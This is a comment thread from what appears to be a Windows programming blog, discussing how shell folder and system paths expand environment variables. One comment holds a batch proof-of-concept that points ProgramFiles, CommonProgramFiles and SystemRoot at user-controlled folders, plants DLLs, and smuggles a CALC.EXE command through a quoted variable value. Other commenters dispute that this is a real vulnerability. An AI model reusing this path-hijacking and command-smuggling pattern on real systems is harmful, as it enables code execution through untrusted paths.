@@ -1,0 +1,414 @@
+Stefan Kanthak  May 24, 2020
+
+
+  0  Collapse this comment
+Copy link
+“Accidentally reconfiguring the system.”
+Its time to learn a new german word: Unfallverhütungsvorschrift!
+Also “Software Engineering” may come into your mind…
+A PROPERLY designed and implemented product does NOT allow such accidents!
+
+
+
+
+
+skSdnW  May 23, 2020
+
+
+  0  Collapse this comment
+Copy link
+%ProgramData% relative special folders have the same issue.
+The strange thing is, this expansion issue only applies to the older special folders. Even if you use the newer Known Folder API, the old special folders have this issue (Common Templates etc.) while the KF-only folders (CommonRingtones etc.) do not.
+
+
+
+
+
+Matthew Jackson  May 21, 2020
+
+
+  0  Collapse this comment
+Copy link
+I recently came across something certainly related to this. I was surprised that scripts running under Jenkins jobs were accessing user profile information from C:\Windows\ instead of C:\Users\. I chalked it up to the fact that we were running Jenkins as a Windows Service.
+
+
+
+
+
+Stefan Kanthak  May 21, 2020
+
+
+  0  Collapse this comment
+Copy link
+Normal behaviour if the profile used is C:\Windows\System32\Config\SystemProfile, C:\Windows\ServiceProfiles\LocalService or C:\Windows\ServiceProfiles\NetworkService
+The latter two are the profiles for the "NT AUTHORITY\LOCAL SERVICE" alias "LocalService" and the "NT AUTHORITY\NETWORK SERVICE" alias "NetworkService" accounts, both introduced with Windows XP, initially stored in the directories "C:\Documents and Settings\LocalService" and "C:\Documents and Settings\NetworkService", relocated to their current locations with Vista.
+The first profile, introduced with Windows 2000, is for the "NT AUTHORITY\SYSTEM" alias "LocalSystem" account.
+Its location is yet another design bug, since it is subject to File System Redirection on 64-bit installations!
+Admire the result of the "lobotomy" or "schizophrenia" in C:\Windows\SysWoW64\Config\SystemProfile
+And while...Read moreNormal behaviour if the profile used is C:\Windows\System32\Config\SystemProfile, C:\Windows\ServiceProfiles\LocalService or C:\Windows\ServiceProfiles\NetworkService
+The latter two are the profiles for the “NT AUTHORITY\LOCAL SERVICE” alias “LocalService” and the “NT AUTHORITY\NETWORK SERVICE” alias “NetworkService” accounts, both introduced with Windows XP, initially stored in the directories “C:\Documents and Settings\LocalService” and “C:\Documents and Settings\NetworkService”, relocated to their current locations with Vista.
+The first profile, introduced with Windows 2000, is for the “NT AUTHORITY\SYSTEM” alias “LocalSystem” account.
+Its location is yet another design bug, since it is subject to File System Redirection on 64-bit installations!
+Admire the result of the “lobotomy” or “schizophrenia” in C:\Windows\SysWoW64\Config\SystemProfile
+And while you are here take a look into the registry hive of the “LocalSystem” account:
+[HKEY_USERS\S-1-5-18\Environment]
+"PATH"=expand:"%USERPROFILE%\\AppData\\Local\\Microsoft\\WindowsApps;"
+"TEMP"=expand:"%USERPROFILE%\\AppData\\Local\\Temp"
+"TMP"=expand:"%USERPROFILE%\\AppData\\Local\\Temp"
+Then verify whether C:\Windows\System32\Config\SystemProfile\AppData\Local\Temp and eventually C:\Windows\SysWoW64\Config\SystemProfile\AppData\Local\Temp exist…
+Also don’t forget to inspect the environment variables TEMP and TMP of processes running under the “LocalSystem” account…
+Oh what a lovely mess!
+Read less
+
+
+
+
+
+
+Ondra Hošek  May 21, 2020
+
+
+  0  Collapse this comment
+Copy link
+Is there a canonical list of environment variables that have special meaning?
+
+
+
+
+
+Stefan Kanthak  May 20, 2020
+
+
+  0  Collapse this comment
+Copy link
+Thanks for posting about one of Windows many design bugs.
+This one was introduced with Vista.
+Before Vista, the "All Users" profile was used to store "Common Desktop", "Common Documents" etc.
+The base path to this profile is provided by the function GetAllUsersProfileDirectory() (https://msdn.microsoft.com/en-us/library/bb762276.aspx), from which the environment variable ALLUSERSPROFILE is set during user login.
+The Directory Shuffle performed for Vista introduced the "Public" profile and C:\ProgramData, accompanied by the new environment variables PUBLIC and ProgramData
+Some short-sighted developers but either forgot to implement a function GetPublicProfileDirectory() which retrieves the fully qualified path of this new profile from
+<code>
+and...Read moreThanks for posting about one of Windows many design bugs.
+This one was introduced with Vista.
+Before Vista, the “All Users” profile was used to store “Common Desktop”, “Common Documents” etc.
+The base path to this profile is provided by the function GetAllUsersProfileDirectory() (https://msdn.microsoft.com/en-us/library/bb762276.aspx), from which the environment variable ALLUSERSPROFILE is set during user login.
+The Directory Shuffle performed for Vista introduced the “Public” profile and C:\ProgramData, accompanied by the new environment variables PUBLIC and ProgramData
+Some short-sighted developers but either forgot to implement a function GetPublicProfileDirectory() which retrieves the fully qualified path of this new profile from
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList]
+"Public"=expand:"%SystemDrive%\\Users\\Public"
+and use it in SHGetFolderPath() etc., or to use GetProfilesDirectory() (https://msdn.microsoft.com/en-us/library/bb762278.aspx) and append “\Public” to it.
+Instead they introduced yet another vulnerability and query a user-controlled environment variable to retrieve an administrator-controlled path.
+JFTR: since GetDefaultUserProfileDirectory() (https://msdn.microsoft.com/en-us/library/bb762277.aspx) exists and retrieves the fully qualified path of the “Default” user profile from
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList]
+"Default"=expand:"%SystemDrive%\\Users\\Default"
+GetPublicUserProfileDirectory() would be a logical extension to that scheme.
+In case you need proof that referencing user-controlled environment variables to resolve paths is braindead, see https://skanthak.homepage.t-online.de/offender.html or run the following commands:
+CHDIR /D "%USERPROFILE%"
+SET CommonProgramFiles=%CD%
+MKDIR "System\OLE DB"
+COPY "%SystemRoot%\System32\SHUNIMPL.DLL" "System\OLE DB\OLEDB32.DLL"
+ASSOC .UDL
+FTYPE MSDASC
+COPY NUL: System\EXPLOIT.UDL
+START System\EXPLOIT.UDL
+SET ProgramFiles=%CD%
+MKDIR "Windows Photo Viewer"
+COPY "%SystemRoot%\System32\SHUNIMPL.DLL" "Windows Photo Viewer\PhotoViewer.dll"
+ASSOC .TIF
+FTYPE TIFImage.Document
+RENAME System\EXPLOIT.UDL EXPLOIT.TIF
+START System\EXPLOIT.TIF
+SET ProgramFiles=%SystemRoot%\System32\CALC.EXE^" ^"*
+ASSOC .RTF
+FTYPE rtffile
+RENAME System\EXPLOIT.TIF EXPLOIT.RTF
+START System\EXPLOIT.RTF
+SET SystemRoot=%SystemRoot%\System32\CALC.EXE^" ^"*
+ASSOC .MSU
+FTYPE Microsoft.System.Update.1
+RENAME System\EXPLOIT.RTF EXPLOIT.MSU
+START System\EXPLOIT.MSU
+ASSOC .RLE
+FTYPE rlefile
+RENAME System\EXPLOIT.MSU EXPLOIT.RLE
+START System\EXPLOIT.RLE
+ASSOC .WSH
+FTYPE WSHFile
+RENAME System\EXPLOIT.RLE EXPLOIT.WSH
+START System\EXPLOIT.WSH
+RMDIR /S /Q System
+RMDIR /S /Q "Windows Photo Viewer"
+Read less
+
+
+
+
+
+
+
+Danielix Klimax  May 21, 2020
+
+
+  0  Collapse this comment
+Copy link
+Looks like you are just exploiting yourself. What is gained by attacker that wouldn’t be available otherwise. Big talk and no evidence so far (applies to your previous “vulnerability” assertions too)
+
+
+
+
+
+Stefan Kanthak  May 22, 2020
+
+
+  0  Collapse this comment
+Copy link
+“Looks like you are just exploiting yourself.”
+Only blind without the slightest trace of a clue don’t recognize the trivial denial of service here in addition to https://cwe.mitre.org/data/definitions/426.html and https://cwe.mitre.org/data/definitions/427.html
+Cluebat: both “untrusted path” and “uncontrolled path” include \\‹server›\‹share›\…
+
+
+
+
+
+Raymond Chen Author
+May 22, 2020
+
+
+  0  Collapse this comment
+Copy link
+So far as I can tell, the only person whose service was denied is yourself. It is not a security vulnerability that you can make your own life miserable.
+
+
+
+
+
+Danielix Klimax  May 26, 2020
+
+
+  0  Collapse this comment
+Copy link
+@Stefan Kanthak
+Still throwing stuff of strongly dubious relevance to this discussion. And making even more dubious but strongly worded assertions won’t improve your position either.
+Since you are throwing big words with little understanding then you may want to make yourself familiar with  “The other side of airlock” and “absence of attacker’s gain”.
+
+
+
+
+
+Stefan Kanthak  May 22, 2020
+
+
+  0  Collapse this comment
+Copy link
+You ignored but CWE-426, CWE-427 and CAPEC-471
+Not only that property of the card house known as Windows made and makes life of millions of your customers miserable.
+Ever heard somebody whisper DEFENSE IN DEPTH?
+
+
+
+Vadim Zeitlin  May 20, 2020
+
+
+  0  Collapse this comment
+Copy link
+How topical, I just wish I had read this yesterday, before spending more than an hour trying to find why CryptAcquireContext() failed with a mysterious NTE_PROVIDER_DLL_FAIL error when launching the program using remote debugger, only to find that it relies on SystemRoot being set in the environment, which wasn’t the case.
+I still wonder why do the API functions like this use the environment variables instead of using the registry, isn’t this what it is for? And is there a full list of required environment variables somewhere?
+
+
+
+
+
+Raymond Chen Author
+May 21, 2020
+
+
+  0  Collapse this comment
+Copy link
+I suspect that the API is getting the provider from the registry. What’s happening is that the provider is listed in the registry with a REG_EXPAND_SZ %SystemRoot%. (There is no REG_INSERT_WINDOWS_DIRECTORY_SZ registry value type.)
+
+
+
+
+
+Stefan Kanthak  May 22, 2020
+
+
+  0  Collapse this comment
+Copy link
+“I suspect that the API is getting the provider from the registry.”
+And said “provider” is most likely located in the “system directory”, so every sane developer would have changed their implementation to use LoadLibraryEx(L”‹provider›.dll”, NULL, LOAD_LIBRARY_SEARCH_SYSTEM32) instead of fiddling with either %SystemRoot% or GetWindowsDirectory()/GetSystemDirectory()
+JFTR: LOAD_LIBRARY_SEARCH_SYSTEM32 is available since Windows 8 out-of-the-box, and with update KB2533623 also available for Windows Vista and 7
+
+
+
+
+
+Raymond Chen Author
+May 22, 2020
+
+
+  0  Collapse this comment
+Copy link
+It would be presumptuous of the consumer to assume that “Well, anybody who writes a provider is going to put it in the system directory.”
+
+
+
+
+
+Stefan Kanthak  May 22, 2020
+
+
+  0  Collapse this comment
+Copy link
+OUCH¹: please ask your colleagues who implemented LoadLibraryEx() how it works when called with both a fully qualified path and the LOAD_LIBRARY_SEARCH_SYSTEM32 flag.
+OUCH²: please ask your colleagues who implemented the  consumer why they load DLLs from arbitrary user-controlled paths.
+OUCH³: please ask your colleagues who implemented the installer of the provider whether they intended to add another weakness to Windows!
+And don’t forget to ask your colleagues who published the documentation of CryptAcquireContext() (and any other consumer or provider) why they failed to specify their dependency from %SystemRoot% and its security implications!
+
+
+
+
+
+Stefan Kanthak  May 21, 2020
+
+
+  0  Collapse this comment
+Copy link
+"(There is no REG_INSERT_WINDOWS_DIRECTORY_SZ registry value type)"
+OUCH: of course there is!
+*.MSI, processed by the Windows Installer, have symbolic names for that.
+*.INF, interpreted by the SetupAPI, provide the LDID %10% as well as the DIRID %16420% to resolve %SystemRoot% during installation!
+See https://msdn.microsoft.com/en-us/library/ff553598.aspx and https://msdn.microsoft.com/en-us/library/ff560821.aspx for not just these two LDIDs/DIRIDs
+For a demonstration, fetch the scripts https://skanthak.homepage.t-online.de/download/LDID.INF and https://skanthak.homepage.t-online.de/download/DIRID.INF and "install" them. See https://skanthak.homepage.t-online.de/gimmick.html#dirid for a rather short description.
+Read more“(There is no REG_INSERT_WINDOWS_DIRECTORY_SZ registry value type)”
+OUCH: of course there is!
+*.MSI, processed by the Windows Installer, have symbolic names for that.
+*.INF, interpreted by the SetupAPI, provide the LDID %10% as well as the DIRID %16420% to resolve %SystemRoot% during installation!
+See https://msdn.microsoft.com/en-us/library/ff553598.aspx and https://msdn.microsoft.com/en-us/library/ff560821.aspx for not just these two LDIDs/DIRIDs
+For a demonstration, fetch the scripts https://skanthak.homepage.t-online.de/download/LDID.INF and https://skanthak.homepage.t-online.de/download/DIRID.INF and “install” them. See https://skanthak.homepage.t-online.de/gimmick.html#dirid for a rather short description.
+Read less
+
+
+
+
+
+
+
+Raymond Chen Author
+May 21, 2020
+
+
+  0  Collapse this comment
+Copy link
+You’re not contradicting me. There is no REG_INSERT_WINDOWS_DIRECTORY_SZ registry value type. What you provided was ways of substituting the Windows directory before the string even gets added to the registry. But those aren’t of any help for OS components, because OS components aren’t installed via MSI or INF files.
+
+
+
+
+
+Stefan Kanthak  May 21, 2020
+
+
+  0  Collapse this comment
+Copy link
+I doubt that the installer for OS components misses an equivalent (and if it does, that's yet another design bug): the majority of paths in the registry shipped with current versions of Windows are fix/constant, i.e. they start with C:\
+Since Windows XP Embedded, from which Vista's Component Based Servicing was largely inspired, SETUP.EXE allows to assign an arbitrary drive letter for the "system drive", and "fixes" all pathnames beginning with C:\ not just in the registry during deployment.
+Your company and your developers have the tools, but are obviously to lazy/sloppy/clueless/careless to use them properly, and put your customers/users...Read moreI doubt that the installer for OS components misses an equivalent (and if it does, that’s yet another design bug): the majority of paths in the registry shipped with current versions of Windows are fix/constant, i.e. they start with C:\
+Since Windows XP Embedded, from which Vista’s Component Based Servicing was largely inspired, SETUP.EXE allows to assign an arbitrary drive letter for the “system drive”, and “fixes” all pathnames beginning with C:\ not just in the registry during deployment.
+Your company and your developers have the tools, but are obviously to lazy/sloppy/clueless/careless to use them properly, and put your customers/users at risk!
+To quote https://blogs.technet.microsoft.com/srd/2014/05/13/load-library-safely/:
+“Always specify the fully qualified path when the library location is constant.”
+A pathname containing an environment variable is NOT constant.
+See https://cwe.mitre.org/data/definitions/426.html and https://cwe.mitre.org/data/definitions/427.html among others for this well-known and well-documented weakness.
+Read less
+
+
+
+
+
+
+Stefan Kanthak  May 20, 2020
+
+
+  0  Collapse this comment
+Copy link
+There’s absolutely no need to query the registry: GetWindowsDirectory() and GetSystemDirectory() exist!
+
+
+
+
+Chris  May 20, 2020
+
+
+  0  Collapse this comment
+Copy link
+Getting build environments to play nice with Jenkins is all part of the fun.
+
+
+
+
+
+Ian Kemp  June 1, 2020
+
+
+  0  Collapse this comment
+Copy link
+You mean, getting Jenkins to play nice…
+
+
+
+
+GL  May 20, 2020
+
+
+  0  Collapse this comment
+Copy link
+I expected SHGetFolderPath to dig into a hive under HKLM 🤔
+
+
+
+
+
+Akash Bagh  May 20, 2020
+
+
+  0  Collapse this comment
+Copy link
+This comment has been deleted.
+
+
+
+
+
+Stefan Kanthak  May 20, 2020
+
+
+  0  Collapse this comment
+Copy link
+There?
+<code>
+Better read these entries beforehand:
+<code>
+Read moreThere?
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders]
+"Common AppData"=expand:"%ProgramData%"
+"Common Desktop"=expand:"%PUBLIC%\\Desktop"
+"Common Documents"=expand:"%PUBLIC%\\Documents"
+"Common Programs"=expand:"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs"
+"Common Start Menu"=expand:"%ProgramData%\\Microsoft\\Windows\\Start Menu"
+"Common Startup"=expand:"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+"Common Templates"=expand:"%ProgramData%\\Microsoft\\Windows\\Templates"
+"CommonMusic"=expand:"%PUBLIC%\\Music"
+"CommonPictures"=expand:"%PUBLIC%\\Pictures"
+"CommonVideo"=expand:"%PUBLIC%\\Videos"
+"{3D644C9B-1FB8-4f30-9B45-F670235F79C0}"=expand:"%PUBLIC%\\Downloads"
+Better read these entries beforehand:
+[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders]
+"!Do not use this registry key"="Use the SHGetFolderPath or SHGetKnownFolderPath function instead"
+
+[HKEY_USERS\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders]
+"!Do not use this registry key"="Use the SHGetFolderPath or SHGetKnownFolderPath function instead"
+
+[HKEY_USERS\S-1-5-20\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders]
+"!Do not use this registry key"="Use the SHGetFolderPath or SHGetKnownFolderPath function instead"
+Read less
